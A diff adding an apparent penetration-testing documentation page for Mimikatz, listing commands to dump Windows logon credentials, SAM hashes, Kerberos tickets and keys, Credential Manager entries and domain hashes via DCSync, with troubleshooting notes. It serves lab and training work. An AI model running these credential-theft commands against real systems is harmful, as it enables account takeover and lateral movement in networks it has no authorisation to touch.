@@ -1,0 +1,94 @@
+---
+title: "Mimikatz"
+sidebarTitle: "Mimikatz"
+description: "Inspect Windows logon credentials, local account hashes, and Kerberos tickets. Plaintext passwords are not guaranteed."
+keywords: ["mimikatz", "mimikatz.exe", "sekurlsa::logonpasswords", "sekursa::logonpasswords", "privilege::debug", "lsadump::sam", "sekurlsa::ekeys", "sekurlsa::tickets", "lsadump::dcsync", "sekurlsa::credman"]
+boost: 10
+hideFooterPagination: true
+---
+
+{/* Generated from Commands/mimikatz.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+Replace UPPER_CASE values with your lab values.
+
+**Requires:** Run an elevated build matching the target architecture. LSASS access needs suitable privileges; local admin does not bypass LSA protection or Credential Guard.
+
+## Start
+
+**Windows PowerShell**
+
+```powershell
+.\mimikatz.exe
+```
+
+Run subsequent blocks at the mimikatz # prompt; do not type that prompt.
+
+## Read logon credentials
+
+**Mimikatz prompt**
+
+```text
+privilege::debug
+sekurlsa::logonpasswords
+```
+
+A successful debug request reports Privilege 20 OK. Password (null) can be normal; check the WDigest guide below.
+
+## Local SAM hashes
+
+**Mimikatz prompt — SYSTEM context**
+
+```text
+lsadump::sam
+```
+
+Local accounts only. Access denied means the current context cannot read the protected SAM.
+
+## Kerberos keys and tickets
+
+**Mimikatz prompt**
+
+```text
+sekurlsa::ekeys
+sekurlsa::tickets /export
+```
+
+Exports .kirbi files into the current directory.
+
+## Credential Manager
+
+**Mimikatz prompt**
+
+```text
+sekurlsa::credman
+```
+
+## DCSync one domain account
+
+**Mimikatz prompt**
+
+```text
+lsadump::dcsync /domain:DOMAIN_FQDN /user:DOMAIN\USER
+```
+
+Requires directory replication rights and a reachable DC; local administrator alone is insufficient.
+
+## If it fails
+
+| Symptom | Check |
+| --- | --- |
+| Password : (null) | The session may not contain a reusable plaintext password. WDigest caching is disabled by default on modern Windows. Open WDigest below; enabling it only affects subsequent applicable logons, not existing credentials. |
+| Privilege not held / access denied | Confirm an elevated token and target architecture. LSA protection and Credential Guard can still block access; enabling WDigest does not disable either protection. |
+| No expected user or empty Kerberos data | Check which users actually authenticated to this host and how. A network logon need not leave the same credentials as an interactive logon. |
+| Command not found | Use sekurlsa::logonpasswords, not sekursa::logonpasswords. Run it inside Mimikatz, not directly in PowerShell. |
+
+[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=mimikatz)
+
+## Learning and original examples
+
+- [WDigest — plaintext missing](/commands/wdigest)
+- [DCSync and Credential Dumping: Quick Reference](/active-directory/dcsync-credential-dumping)
+- [Pass the Ticket from Windows](/password-attacks/pass-the-ticket-from-windows)
+- [Pass the Hash from Linux and Windows](/password-attacks/pass-the-hash)
